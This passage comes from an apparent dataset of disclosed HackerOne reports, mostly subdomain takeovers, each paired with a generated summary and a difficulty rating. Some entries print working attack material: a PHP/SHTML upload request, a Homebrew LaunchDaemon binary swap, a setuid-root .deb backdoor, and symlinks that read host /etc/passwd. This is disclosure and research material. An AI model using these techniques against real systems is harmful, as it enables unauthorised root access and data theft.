+11svcgatewaydevus.starbucks.com. 600 IN CNAME s00197tmp0crdfuldev0.trafficmanager.net.                                                                                                           
+12
+13;; AUTHORITY SECTION:
+14trafficmanager.net. 30 IN SOA tm1.msft.net. hostmaster.trafficmanager.net. 2003080800 900 300 2419200 30
+PoC:
+http://svcgatewayloadus.starbucks.com/
+http://svcgatewaydevus.starbucks.com/
+Mitigation:
+Remove the CNAME record from the starbucks.com DNS zone
+Claim it in Azure once I release it
+Impact
+Subdomain takeover can be used for several purposes:
+Malware
+Phishing / Spear phishing
+XSS
+Authentication bypass
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves subdomain takeover due to unclaimed CNAME records pointing to Azure resources. An attacker can claim these resources and serve malicious content on Starbucks' subdomains, leading to potential phishing, malware distribution, or other attacks.
+
+Steps to Reproduce:
+1. Check DNS records for subdomains of starbucks.com to identify unclaimed CNAME records pointing to Azure (e.g., svcgatewayloadus.starbucks.com and svcgatewaydevus.starbucks.com).
+2. Claim the unclaimed Azure resources associated with the identified CNAME records to take control of the subdomains.
+Exploitation Difficulty:
+The attack involves identifying unclaimed CNAME records and claiming the associated Azure resources, which is straightforward once the unclaimed records are found. No complex interactions or novel logic is required.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/388622: Subdomain takeover on wfmnarptpc.starbucks.com
+================================================================================
+RAW DESCRIPTION:
+
+Hello,
+this is pretty serious security issue in some context, so please act as fast as possible.
+Overview:
+One of the starbucks.com subdomains is pointing to Azure, which has unclaimed CNAME record. ANYONE is able to own starbucks.com subdomain at the moment.
+This vulnerability is called subdomain takeover. You can read more about it here:
+https://0xpatrik.com/subdomain-takeover-basics/
+Details:
+wfmnarptpc.starbucks.com has CNAME to s00149tmppcrpt.trafficmanager.net. However, s00149tmppcrpt.trafficmanager.net is not registered in Azure cloud anymore and thus can be registered by anyone. After registering the TrafficManager Profile in Azure portal, the person doing so has full control over content on wfmnarptpc.starbucks.com.
+PoC:
+http://wfmnarptpc.starbucks.com/poc.html
+Mitigation:
+Remove the CNAME record from starbucks.com DNS zone completely.
+Claim it back in Azure portal after I release it
+Regards,
+Patrik Hudak
+Impact
+Subdomain takeover is abused for several purposes:
+Malware distribution
+Phishing / Spear phishing
+XSS
+Authentication bypass
+...
+List goes on and on. Since some certificate authorities (Let's Encrypt) require only domain verification, SSL certificate can be easily generated.
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain wfmnarptpc.starbucks.com has a CNAME record pointing to an unclaimed Azure Traffic Manager profile (s00149tmppcrpt.trafficmanager.net). This allows anyone to register the Traffic Manager profile in Azure and take control of the subdomain, leading to potential misuse such as malware distribution, phishing, or other malicious activities.
+
+Steps to Reproduce:
+1. Identify the subdomain wfmnarptpc.starbucks.com and check its DNS records to find the CNAME pointing to s00149tmppcrpt.trafficmanager.net.
+2. Verify that s00149tmppcrpt.trafficmanager.net is unclaimed in Azure by attempting to register it in the Azure portal.
+Exploitation Difficulty:
+The vulnerability involves a straightforward process of identifying an unclaimed CNAME record and registering it in a cloud service. The steps are simple and do not require deep understanding of complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/412481: China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability
+================================================================================
+RAW DESCRIPTION:
+
+### 1, Summary
+During the test, I found ecjobsdc.starbucks.com.cn this site has an upload vulnerability, you can upload html and shtml format files, so you can read the server's intranet IP, the physical address of the website application and read the website web.config file.
+###2, Vulnerability scope
+https://ecjobsdc.starbucks.com.cn
+###3, proof of exploit
+By modifying the suffix of filename, this address can be uploaded to upload html and shtml files, so that you can read the server's intranet IP, the physical address of the website application, and the configuration file of the website.
+Vulnerability certificate
+Code 668 Bytes
+1POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
+2Host: ecjobsdc.starbucks.com.cn
+3Connection: close
+4Content-Length: 234
+5Cache-Control: max-age=0
+6Origin: null
+7Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06
+8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+9Accept-Encoding: gzip, deflate
+10Accept-Language: zh-CN,zh;q=0.9
+11
+12------WebKitFormBoundaryevPInYidBxSvSd06
+13Content-Disposition: form-data; name="hxwebfileboxcontrol_upload_file_inputbox"; filename="xxx.shtml"
+14Content-Type: text/html
+15
+16<?php echo 1111;>
+17------WebKitFormBoundaryevPInYidBxSvSd06--
+Successfully read the website's remoteaddr webpathinfo web.config file.
+Code 829 Bytes
+1DOCUMENT_NAMED:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
+2SERVER_SOFTWARE :Microsoft-IIS/8.5
+3SERVER_NAME :ecjobsdc.starbucks.com.cn
+4SERVER_PORT :80
+5REMOTE_ADDR:10.92.29.50
+6REMOTE_HOST:10.92.29.50
+7D:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
+8PATH_INFO:/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
+9text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+10/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
+11<?xml version="1.0" encoding="UTF-8"?>
+12<configuration>
+13    <system.webServer>
+14        <httpRedirect enabled="false" destination="https://ecjobs.starbucks.net" exactDestination="false" />
+15    </system.webServer>
+16</configuration>
+<image_0>
+Impact
+Phishing attack, remote file reading
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability allows an attacker to upload HTML and SHTML files to the server, which can then be used to read sensitive server information including the intranet IP, physical address of the website application, and the web.config file. This can lead to phishing attacks and remote file reading.
+
+Steps to Reproduce:
+1. Send a POST request to https://ecjobsdc.starbucks.com.cn/recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file with a multipart form data containing an HTML or SHTML file.
+2. Access the uploaded file to read server information such as intranet IP, physical address, and web.config file.
+Exploitation Difficulty:
+The vulnerability involves a straightforward file upload mechanism without proper validation of file types. The attack does not require complex interactions or manipulation of application states, and the logic is commonly found in other applications.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/484420: Subdomain takeover on usclsapipma.cv.ford.com
+================================================================================
+RAW DESCRIPTION:
+
+Hello Ford H1 team,
+I want to report a Subdomain takeover vulnerability in this report, a pretty serious security issue in some context.
+Overview:
+One of the ford.com subdomains is pointing to Azure, which has unclaimed CNAME record. ANYONE is able to own ford.com subdomain at the moment.
+This vulnerability is called subdomain takeover. You can read more about it here:
+https://blog.sweepatic.com/subdomain-takeover-principles/
+https://labs.detectify.com/tag/hostile-subdomain-takeover/
+https://hackerone.com/reports/325336
+Details:
+usclsapipma.cv.ford.com has CNAME usclsapipma.trafficmanager.net wich has a CNAME to feuscspma3fcvapi.eastus.cloudapp.azure.com. However, feuscspma3fcvapi.eastus.cloudapp.azure.com is not registered in Azure cloudapp Virtual machine anymore and thus can be registered as FQDN for a easus VM by anyone. After registering the Cloud App Virtual Machine in Azure portal, the person doing so has full control over traffic on dynatraceppeast01.cf.ford.com (so, not only HTTP/HTTPS but also mails traffic, etc, since we have full control over the virtual machine and it's OS).
+Mitigation:
+Remove the CNAME record from ford.com DNS zone completely.
+OR
+Claim it back in Azure portal
+Files :
+Azure-check-availability.png -> Screenshot of the Azure website api "check availability" for the "eastus" cloudapp virtual machine. on the link, you can see the location "eastus" part of the fqdn ad the DomainNameLabel "feuscspma3fcvapi" part of the FQDN, and the "available : true" response for this fqdn.
+dns-proof.png -> Result of a "dig" command for this domains, showing the "NXDOMAIN" reponse for the CNAME entry of the ford subdomain.
+Cheers,
+March_42
+Impact
+Subdomain takeover can be abused to do several things like :
+Malware distribution
+Phishing / Spear phishing
+XSS
+Authentication bypass
+Legitimate mail sending and receiving on behalf of ford subdomain
+...
+List goes on and on.
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain usclsapipma.cv.ford.com has a CNAME record pointing to an unclaimed Azure resource (feuscspma3fcvapi.eastus.cloudapp.azure.com). Since the Azure resource is not claimed, an attacker can register it and gain control over the subdomain, leading to potential malicious activities such as malware distribution, phishing, and unauthorized email operations.
+
+Steps to Reproduce:
+1. Identify the subdomain usclsapipma.cv.ford.com and check its DNS records using a tool like dig or nslookup.
+2. Verify that the CNAME record points to an unclaimed Azure resource by checking the availability of feuscspma3fcvapi.eastus.cloudapp.azure.com in the Azure portal.
+Exploitation Difficulty:
+The vulnerability involves checking DNS records and verifying the availability of an Azure resource, which are straightforward steps. The interaction between the DNS configuration and Azure resource availability is not subtle or complex.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/496285: Ubuntu Linux privilege escalation (dirty_sock)
+================================================================================
+RAW DESCRIPTION:
+
+Hi team,
+This week, I have publicly disclosed the dirty_sock local root exploit affecting multiple Linux Operating Systems.
+Very detailed information on the vulnerability can be found in my blog posting here.
+And the exploit code can be found in my GitHub repository here.
+The vulnerability exists in stock versions of Ubuntu Linux due to the default inclusion of the snapd service, but all Linux distributions are vulnerable if they install the package. The disclosure was handled directly with Canonical via the bug tracked here.
+A large percentage of the Internet is safer today than it was a week ago, due to the amazing response by the team at Canonical.
+Impact
+Linux relies on a functioning security model, particularly in environments shared by multiple users. The ability of any user to obtain immediate root access completely breaks this model, putting sensitive data all around the world at risk of exposure.
+The exploits provided allow any user to immediately elevate to a root account.
+
+
+
+================================================================================
+Vulnerability Description:
+The dirty_sock vulnerability allows any local user to escalate privileges to root on Ubuntu Linux systems due to a flaw in the snapd service. The exploit leverages the service's default inclusion and misconfiguration to gain root access.
+
+Steps to Reproduce:
+1. Identify that the target system is running Ubuntu Linux with the snapd service installed and running.
+2. Download and execute the exploit code from the GitHub repository provided in the report.
+Exploitation Difficulty:
+The vulnerability involves understanding the snapd service's default configuration and its interaction with the system's privilege model. The exploit requires knowledge of how to craft a specific payload to trigger the privilege escalation, but the steps are straightforward once the initial conditions are met.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/586251: Homebrew installed LaunchDaemons create simple root esclations
+================================================================================
+RAW DESCRIPTION:
+
+Many programs installed via Homebrew require services to function as expected - most of the time these are LaunchAgents but sometimes they need to run as root via LaunchDaemons to function properly. While Homebrew attempts to secure the executables run by the LaunchDaemons that it installs, any other program running as the user can easily swap out the program for a simple root escalation.
+Reproduction steps:
+In this case, we'll be looking at dnsmasq, but there are many others
+Install macOS Mojave 10.14.5, create an account and login.
+Install homebrew with the instructions on brew.sh.
+Run brew install dnsmasq - brew will tell the user to run sudo brew services start dnsmasq
+Run sudo brew services start dnsmasq as prompted.
+Code 511 Bytes
+1samuels-Mac:~ samuel$ sudo brew services start dnsmasq
+2Password:
+3==> Tapping homebrew/services
+4Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-services'...
+5remote: Enumerating objects: 17, done.
+6remote: Counting objects: 100% (17/17), done.
+7remote: Compressing objects: 100% (14/14), done.
+8remote: Total 17 (delta 0), reused 12 (delta 0), pack-reused 0
+9Unpacking objects: 100% (17/17), done.
+10Tapped 1 command (50 files, 62.6KB).
+11==> Successfully started `dnsmasq` (label: homebrew.mxcl.dnsmasq)
+We'll find a new LaunchDaemon has been created:
+Code 653 Bytes
+1samuels-Mac:~ samuel$ cat /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist 
+2<?xml version="1.0" encoding="UTF-8"?>
+3<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+4<plist version="1.0">
+5  <dict>
+6    <key>Label</key>
+7    <string>homebrew.mxcl.dnsmasq</string>
+8    <key>ProgramArguments</key>
+9    <array>
+10      <string>/usr/local/opt/dnsmasq/sbin/dnsmasq</string>
+11      <string>--keep-in-foreground</string>
+12      <string>-C</string>
+13      <string>/usr/local/etc/dnsmasq.conf</string>
+14    </array>
+15    <key>RunAtLoad</key>
+16    <true/>
+17    <key>KeepAlive</key>
+18    <true/>
+19  </dict>
+20</plist>
+If we look at the folder /usr/local/opt/dnsmasq/sbin we can see that our user doesn't have write permissions on the /usr/local/opt/dnsmasq/sbin/dnsmasq program which the LaunchDaemon runs.
+Code 359 Bytes
+1samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin
+2total 560
+3drwxr-xr-x   3 samuel  staff    96B Oct 18  2018 .
+4drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..
+5-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq
+6samuels-Mac:~ samuel$ echo "" >> /usr/local/opt/dnsmasq/sbin/dnsmasq 
+7-bash: /usr/local/opt/dnsmasq/sbin/dnsmasq: Permission denied
+However, because our user does have write permissions on the /usr/local/opt/dnsmasq/sbin directory, an attacker can move /usr/local/opt/dnsmasq/sbin/dnsmasq to the side and replace it with a different executable:
+Code 738 Bytes
+1samuels-Mac:~ samuel$ cat /tmp/evil.sh 
+2#!/bin/sh
+3
+4touch /Library/evil
+5
+6exit 0
+7
+8samuels-Mac:~ samuel$ ls -lah /tmp/evil.sh 
+9-rwxr-xr-x  1 samuel  wheel    40B May 20 12:30 /tmp/evil.sh
+10samuels-Mac:~ samuel$ mv /usr/local/opt/dnsmasq/sbin/dnsmasq /usr/local/opt/dnsmasq/sbin/dnsmasq.bak
+11samuels-Mac:~ samuel$ mv /tmp/evil.sh /usr/local/opt/dnsmasq/sbin/dnsmasq
+12samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin/
+13total 568
+14drwxr-xr-x   4 samuel  staff   128B May 20 12:31 .
+15drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..
+16-rwxr-xr-x   1 samuel  wheel    40B May 20 12:30 dnsmasq
+17-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq.bak
+18samuels-Mac:~ samuel$ ls -lah /Library/evil
+19ls: /Library/evil: No such file or directory
+Once the service relaunches for any reason (reboot of the Mac is most likely), root will execute the malicious executable.
+Code 104 Bytes
+1samuels-Mac:~ samuel$ ls -lah /Library/evil 
+2-rw-r--r--  1 root  wheel     0B May 20 12:34 /Library/evil
+Impact
+Any homebrew formula which prompts users to run sudo brew services start opens up this vulnerability.
+Once this is opened up, any attacker who can run code as the user can easily escalate to root.
+
+
+
+================================================================================
+Vulnerability Description:
+Homebrew-installed LaunchDaemons can be exploited for root escalation by replacing the executable they run with a malicious script, as the user has write permissions on the directory containing the executable.
+
+Steps to Reproduce:
+1. Install macOS Mojave 10.14.5, create an account and login.
+2. Install homebrew with the instructions on brew.sh.
+3. Run brew install dnsmasq - brew will tell the user to run sudo brew services start dnsmasq
+4. Run sudo brew services start dnsmasq as prompted.
+5. Replace the dnsmasq executable with a malicious script.
+6. Wait for the service to relaunch (e.g., via reboot) to execute the malicious script as root.
+Exploitation Difficulty:
+The vulnerability involves understanding Homebrew's service management and LaunchDaemons, but the steps to exploit it are straightforward once these components are known. The interaction between directory permissions and service execution is not overly complex.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/661751: Subdomain takeover of d02-1-ag.productioncontroller.starbucks.com
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+I was able to claim the subdomain: d02-1-ag.productioncontroller.starbucks.com using Azure Cloud Service
+Platform(s) Affected:
+Subdomain
+Azure Cloud Service
+Steps To Reproduce:
+Using dig, I was able to determine that the subdomain 'd02-1-ag.productioncontroller.starbucks.com' was vulnerable to takeover. The record showed status: NXDOMAIN and was pointing to the CNAME: 3edbac0a-5c43-428a-b451-a5eb268f888b.cloudapp.net.
+Using this information, I was able to create a new Azure Cloud Service with the name '3edbac0a-5c43-428a-b451-a5eb268f888b'. This would resolve to the CNAME record mentioned above.
+I then crafted a website and uploaded it to the cloud service using this as a guide: https://docs.microsoft.com/en-us/azure/cloud-services/cloud-services-how-to-create-deploy-portal.
+I was then able to view the uploaded site at http://d02-1-ag.productioncontroller.starbucks.com
+Supporting Material/References:
+POC:
+http://d02-1-ag.productioncontroller.starbucks.com/poc-2sKR4C.html
+How can the system be exploited with this bug?
+See impact below.
+How did you come across this bug ?
+Using enumeration, I was able to discover this domain and determined it was vulnerable by the DNS record data mentioned in the steps above.
+Recommendations for fix
+To mitigate this issue you can:
+Remove the DNS record from the DNS zone if it is no longer needed.
+Claim the domain name in a permanent DNS record so it cannot be used elsewhere.
+Impact
+This is extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the starbucks.com domain. This would allow them to post malicious content which would be mistaken for a valid site. They could steal cookies, bypass domain security, steal sensitive user data, etc. Here is a nice write-up of the vulnerabilities: https://0xpatrik.com/subdomain-takeover/
+As mentioned in the write-up above the
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain 'd02-1-ag.productioncontroller.starbucks.com' was vulnerable to takeover due to an unclaimed CNAME record pointing to an Azure Cloud Service. An attacker could claim the subdomain by creating an Azure Cloud Service with the same name as the CNAME record, allowing them to host malicious content under the Starbucks domain.
+
+Steps to Reproduce:
+1. Use dig to check the DNS records for the subdomain 'd02-1-ag.productioncontroller.starbucks.com' and note the CNAME pointing to '3edbac0a-5c43-428a-b451-a5eb268f888b.cloudapp.net'.
+2. Create a new Azure Cloud Service with the name '3edbac0a-5c43-428a-b451-a5eb268f888b' and upload a custom website to it.
+Exploitation Difficulty:
+The attack involves a straightforward process of checking DNS records and claiming an unclaimed Azure Cloud Service. There are no complex interactions or state manipulations required, and the logic is commonly understood in subdomain takeover scenarios.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/665398: Subdomain takeover of datacafe-cert.starbucks.com
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+The subdomain datacafe-cert.starbucks.com had an CNAME record pointing to an unclaimed Azure webservice. This is a high severity security issue because an attacker can register the subdomain on Azure and therefore can own the subdomain datacafe-cert.starbucks.com.
+Description:
+The dangling CNAME record of datacafe-cert.starbucks.com is pointing to s00397nasv101-datacafe-cert.azurewebsites.net which was not claimed by you. I registered a service with this name and therefore was able to takeover the subdomain. Every attacker doing this has afterwords full control over the contents served on this subdomain.
+Platform(s) Affected:
+http://datacafe-cert.starbucks.com/
+https://datacafe-cert.starbucks.com/
+Supporting Material/References:
+view-source:http://datacafe-cert.starbucks.com/
+How can the system be exploited with this bug?
+The full domain can be taken over. Arbitrary content can be served under it.
+How did you come across this bug ?
+I noticed the dangling CNAME record of datacafe-cert.starbucks.com.
+Recommendations for fix
+1) Remove the dangling CNAME record from datacafe-cert.starbucks.com
+2) I release s00397nasv101-datacafe-cert.azurewebsites.net
+3) You can reclaim it if you want
+Impact
+This issue can be exploited in several ways, for example but not limited to: XSS, Phishing, Session Hijacking due to bypassing of SOP
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain datacafe-cert.starbucks.com had a CNAME record pointing to an unclaimed Azure webservice, allowing an attacker to register the service and take over the subdomain. This could lead to serving malicious content, phishing, or other attacks.
+
+Steps to Reproduce:
+1. Identify the subdomain datacafe-cert.starbucks.com and check its DNS records for a CNAME entry.
+2. Verify that the CNAME points to an unclaimed Azure webservice (s00397nasv101-datacafe-cert.azurewebsites.net).
+Exploitation Difficulty:
+The vulnerability involves a straightforward check of DNS records and requires no complex interactions or state manipulations. The discovery process is simple and well-documented in security research.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/692603: Privilege escalation in workers container 
+================================================================================
+RAW DESCRIPTION:
+
+Summary about the bugs:
+In the prepare step, semmle allows user to install new package.
+By upload a malicious package along with source code and force server to build this package, attacker will gain root access to the container
+Steps:
+Create a malicious package contains the backdoor:
+I use this guide (https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/) to create the package.
+With the content of postinst is
+Code 189 Bytes
+1#!/bin/sh
+2
+3ps -ef
+4sudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &
+5
+Content of /opt/src/run:
+Code 97 Bytes
+1#include <stdio.h>
+2void main(int argc, char *argv[]) {
+3    setreuid(0, 0);
+4    system(argv[1]);
+5}
+After that i will got a malicious .deb package.
+Create a config file to install this malicious package:
+Because the source code is imported before the prepare step happens, so i will be able to install this package by point directly to it like this /opt/src/work.deb.
+The install command now will be like this apt install -y --no-recommend /opt/src/work.deb. And it is legal.
+The build config:
+Code 181 Bytes
+1extraction:
+2  java:
+3    prepare:
+4      packages:
+5        - /opt/src/work.deb
+6    after_prepare:
+7      - echo pwned >> /opt/out/snapshot/log/build.log
+8      - /usr/bin/setpasswd 'id'
+After that the build will failed, and attacker will get root on the container by running the setuid backdoor
+PoC is attached below
+Thanks & regard!
+Impact
+Attacker will get root access and will be able to dump every sensitive datas in the server!
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability allows privilege escalation in a workers container by exploiting the ability to install custom packages during the prepare step. An attacker can upload a malicious package that creates a SUID binary, granting root access when executed.
+
+Steps to Reproduce:
+1. Create a malicious .deb package with a postinst script that sets up a SUID backdoor
+2. Configure the build process to install the malicious package during the prepare step
+3. Trigger the build process to execute the backdoor and gain root access
+Exploitation Difficulty:
+This attack requires understanding of package creation, SUID exploitation, and build process manipulation. While the components are known techniques, their combination in this specific context requires careful coordination.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/694181: Worker container escape lead to arbitrary file reading in host machine
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+Because lack of security, attacker will be able to remove original log file and replace it will a symlink to other file,
+After finishing job, host machine copy file from docker container.
+Because the original log file has been removed, the host machine will copy the symlink file.
+But the problem is it doesn't copy the linked file in container, it copys the linked file in the HOST MACHINE.
+Steps To Reproduce:
+The attack is very simple, just remove the original build.log file and replace with a symlink file,
+I used this configuration to read the /etc/passwd:
+Code 125 Bytes
+1  cpp:
+2    after_prepare:
+3      - rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
+PoC
+Content of /etc/passwd is attached below
+Impact
+Give attacker ability to explore the host machine, expose more sensitive informations from it.
+
+
+
+================================================================================
+Vulnerability Description:
+A container escape vulnerability allows an attacker to replace a log file with a symlink pointing to a file on the host machine. When the host copies the file from the container, it follows the symlink on the host instead of the container, leading to arbitrary file read access on the host.
+
+Steps to Reproduce:
+1. Remove the original build.log file in the container
+2. Create a symlink from build.log to a target file on the host machine (e.g., /etc/passwd)
+Exploitation Difficulty:
+The attack involves understanding symlink behavior in container-host file interactions, but the steps are straightforward once this behavior is known. No complex state manipulation or novel logic is required.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/697055: Worker container escape lead to arbitrary file reading in host machine [again]
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+After a successful build, LGTM allow user to view the file list.
+By default, only source code files and build config files are reserved (lgtm.yml and .lgtm.yml).
+If there are both files in folder, LGTM will process lgtm.yml file and skip .lgtm.yml, but it still keeps both of files in directory.
+By making symlink to .lgtm.yml file, after successful build, it will point to HOST MACHINE file!
+Steps To Reproduce:
+Create a simple project which LGTM can build successful. In this report, I use this project (https://github.com/testanull/test11)
+Create file: lgtm.yml with a valid config content, for example:
+Code 74 Bytes
+1extraction:
+2  java:
+3    index:
+4      build_command:
+5      - ./custom-build
+Make a symlink point to a HOST MACHINE file/directory with name: .lgtm.yml
+After successful build, .lgtm.yml file will contain the host machine file content!
+PoC of reading /etc/passwd is attached below
+Impact
+Give attacker ability to explore the host machine, expose more sensitive informations from it.
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability allows an attacker to read arbitrary files on the host machine by exploiting a symlink issue in LGTM's file handling. By creating a symlink named '.lgtm.yml' pointing to a host machine file, the attacker can access the content of that file after a successful build.
+
+Steps to Reproduce:
+1. Create a simple project that LGTM can build successfully.
+2. Create a file named 'lgtm.yml' with a valid configuration content.
+3. Make a symlink named '.lgtm.yml' pointing to a file/directory on the host machine.
+4. After a successful build, the '.lgtm.yml' file will contain the host machine file content.
+Exploitation Difficulty:
+The attack involves understanding LGTM's file handling logic, specifically how it processes '.lgtm.yml' files when 'lgtm.yml' is also present. The interaction between the symlink and the file processing logic is subtle but not overly complex. The attacker needs to know about the file handling behavior and how symlinks can be exploited in this context.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/779442: Subdomain takeover of storybook.lystit.com
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+The subdomain storybook.lystit.com had an CNAME record pointing to an unclaimed S3 bucket. This is a high severity security issue because an attacker can register the bucket on AWS and therefore can serve her own content on the subdomain. This allows for various attacks.
+Description:
+The dangling CNAME record of storybook.lystit.com is pointing to ███████ and the bucket which could not be found was: "storybook.lystit.com". I was able to register a S3 bucket with this name in AWS. After enabling static website hosting I was able to takeover the subdomain and serve arbitrary content. I am serving a POC to proof I am controlling the subdomain as well as a simple XSS POC.
+POC
+<image_0>
+Supporting Material/References:
+https://www.hackerone.com/blog/Guide-Subdomain-Takeovers
+Recommendations for fix
+Remove the dangling CNAME record from storybook.lystit.com
+Impact
+The domain takeover allows various attacks. As the full domain is attacker controlled it can be used to serve XSS attacks, phishing campaigns and might be used to bypass the Same Origin Policy on other lystit.com domains and services.
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain storybook.lystit.com had a CNAME record pointing to an unclaimed S3 bucket, allowing an attacker to register the bucket and serve malicious content. This could lead to various attacks such as XSS, phishing, and bypassing the Same Origin Policy.
+
+Steps to Reproduce:
+1. Identify the subdomain storybook.lystit.com and check its DNS records to find a CNAME pointing to an unclaimed S3 bucket.
+2. Register the S3 bucket with the name 'storybook.lystit.com' on AWS, enable static website hosting, and serve arbitrary content to demonstrate control over the subdomain.
+Exploitation Difficulty:
+The vulnerability involves identifying a dangling DNS record and registering an unclaimed S3 bucket, which is a straightforward process once the initial discovery is made. The attack does not require complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/824909: Subdomain Takeover uptime
+================================================================================
+RAW DESCRIPTION:
+
+Hello Team:
+i can't report it to the company so i hope to accept it as a valid bug , i found subdomain takeover in your subdomain uptime.btfs.io , i found this subdomain pointed to uptimerobot and not claimed so i signedup in uptimerobot and claimed it.
+POC:
+<image_0>
+Impact
+Subdomain takeover can be abused to do several things like : Malware distribution Phishing / Spear phishing XSS Authentication bypass Legitimate mail sending and receiving on behalf of ford subdomain
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain uptime.btfs.io was found to be pointing to UptimeRobot but was not claimed, allowing an attacker to claim it and potentially abuse it for malicious purposes such as malware distribution, phishing, or other attacks.
+
+Steps to Reproduce:
+1. Identify the subdomain uptime.btfs.io and check its DNS records to see if it points to a service like UptimeRobot.
+2. If the subdomain is not claimed, sign up for UptimeRobot and claim the subdomain to demonstrate the takeover.
+Exploitation Difficulty:
+The vulnerability involves identifying an unclaimed subdomain and claiming it through a third-party service, which is a straightforward process without complex interactions or multiple components.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/892667: Subdomain takeover of ███
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+The subdomain ██████ had an CNAME record pointing to an unclaimed ███████ webservice. This is a high severity security issue because an attacker can register the subdomain on ███ and therefore can own the subdomain █████████.
+Description:
+The dangling CNAME record of █████████ is pointing to █████.███████ which was not claimed by you. I registered a service with this name and therefore was able to takeover the subdomain. Every attacker doing this has afterwards full control over the contents served on this subdomain.
+Subdomain Affected:
+██████████
+Proof Of Concept:
+I have uploaded a simple subdomain takeover PoC on http://███████/████████
+Step-by-step Reproduction Instructions
+Open ██████ and register for web app which is under market place. I have used ██████ (See: ████)
+After registering, go to Custom Domains which will be available under settings. (See: ████)
+In here, add custom domain i have used █████████ (See: █████)
+After that upload any PoC you want to upload. I have used ████ which has my PoC. (See: ███████)
+Suggested Mitigation/Remediation Actions
+Remove the dangling CNAME record for █████
+Claim it back in ███████ portal after I release it
+Reference
+Some hackerone reports #661751 #325336
+NOTE:
+I have claimed the subdomain http://█████████ at the current moment to keep it safe from malicious users. Whenever you want i will release ██████.███. Afterwards you can claim it back.
+Impact
+Subdomain takeover is abused for several purposes:
+Malware distribution
+Phishing / Spear phishing
+XSS
+
+
+
+================================================================================
+Vulnerability Description:
+A subdomain takeover occurs when a subdomain's CNAME record points to an external service (e.g., a cloud provider) that is no longer claimed or configured. An attacker can register the unclaimed service, effectively gaining control over the subdomain and serving malicious content.
+
+Steps to Reproduce:
+1. Identify a subdomain with a dangling CNAME record pointing to an unclaimed third-party service (e.g., using DNS enumeration tools).
+2. Register the unclaimed service (e.g., on a cloud platform) using the same name as the CNAME target.
+3. Configure the service to host malicious content or phishing pages.
+4. Verify the subdomain now serves content from the newly registered service.
+Exploitation Difficulty:
+The attack involves straightforward steps (DNS checks, service registration) and does not require deep understanding of complex interactions or novel logic. The primary challenge is identifying dangling CNAME records, which is a well-documented technique.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/900062: Subdomain takeover of ████
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+I was able to claim the subdomain: ████ using Microsoft Azure ( CDN profiles)
+Description:
+Impact
+Platform(s) Affected:
+Subdomain
+Azure CDN
+Step-by-step Reproduction Instructions
+Using dig, I was able to determine that the subdomain '███████' was vulnerable to takeover. The record showed status: NXDOMAIN and was pointing to the CNAME: █████.
+Using this information, I was able to create a new Azure CDN Profile with the name '██████████'. This would resolve to the CNAME record mentioned above.
